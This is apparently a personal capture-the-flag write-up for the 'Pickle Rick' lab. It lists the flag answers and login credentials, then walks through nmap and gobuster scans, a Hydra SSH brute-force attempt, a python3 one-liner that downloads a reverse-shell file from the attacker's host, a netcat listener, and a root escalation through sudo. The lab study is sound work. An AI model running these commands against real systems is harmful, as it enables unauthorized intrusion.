export IP=10.10.140.221


==================================================

[TASK 1] - Pickle Rick

1) Deploy the virtual machine on this task and explore the web application. What is the first ingredient Rick needs?

	Answer: `mr. meeseek hair`
	Notes:
		Once I gained access to /portal.php, ran the command, `less Sup3rS3cretPickl3Ingred.txt`

2) Whats the second ingredient Rick needs?

	Answer: `1 jerry tear`
	Notes:
		Using the command, `less /home/rick/"second ingredients"`, I was able to find the second ingredient. However, I think I was suppose to find it another way. Whatever.

3) Whats the final ingredient Rick needs?

	Answer: `fleeb juice`
	Notes:
		See number 10 on how I gained root access.


==================================================

[IMPORTANT INFORMATION]

/login.php
Username:	R1ckRul3s
Password:	Wubbalubbadubdub


==================================================

[APPROACH]

1) Scan machine with nmap:

	Command: `nmap -sC -sV -oN nmap/initial $IP`
	Output:
		- Open Ports 22, 80
		- HTTP Apache 2.4.18 (Ubuntu)

2) Checked out the address: http://$IP. Viewed the source code. I found:
	
	<!--

	Note to self, remember username!

    Username: R1ckRul3s

  	-->

3) Trying gobuster (After watching John Hammond, he includes file extenstions to look for):
	
	Command: `gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,p -o gobuster.txt`
	Output: See `gobuster.txt`

4) Ran nikto for the first time...

	Command: `nikto -h http://$IP | tee nikto.log`
	Output: See `nikto.log`

5) Tried brute forcing into SSH using Hydra:
	
	Command: `hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt $IP ssh`
	Output: No dice. Doesn't support password login meaning it needs SSH.

6) Apache servers most always have a /robots.txt file. Went to http://$IP/robots.txt and found:

	Wubbalubbadubdub

7) After successfully loggin into the /portal.php page (see username/password above). I viewed the source code and found the following, which looks like a hash of some sort:

	Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==

8) While in on the /portal.php page, I can run certain commands (others aren't allowed):

	`ls`
	`less` = lets me view contents of files (cat doesn't work)

9) I can run `nc` (netcat) meaning I could probably open a reverse shell... Took me a while, but ended up finding that I could run python3 scripts inside the portal command text box and so I ran:
	
	Command: 
		1) [though portal.php]: `python3 -c 'import urllib.request as r; r.urlretrieve("http://10.6.8.203:8000/rev-shell.php", "/home/rick/oopsie.php"); print("Got it")'`
		2) [on my machine]: `nc -lnvp 1234`
		3) [through portal.php]: `php /home/rick/oopsie.php`
		extra to stabalize the shell) 
			1) ctrl + 'z'
			2) `stty raw -echo`
			3) `fg` + enter a few times
			4) `export TERM=xterm`



10) After getting the reverse shell working, I managed to also upload 'linpeas.sh' and run it. I found that www-data user (who I was when reverse shelling) didn't have any restrictions with 'sudo' so all I had to do was run the command, `sudo -i` and I was root.

	Command: `sudo -i` (gave me root access)
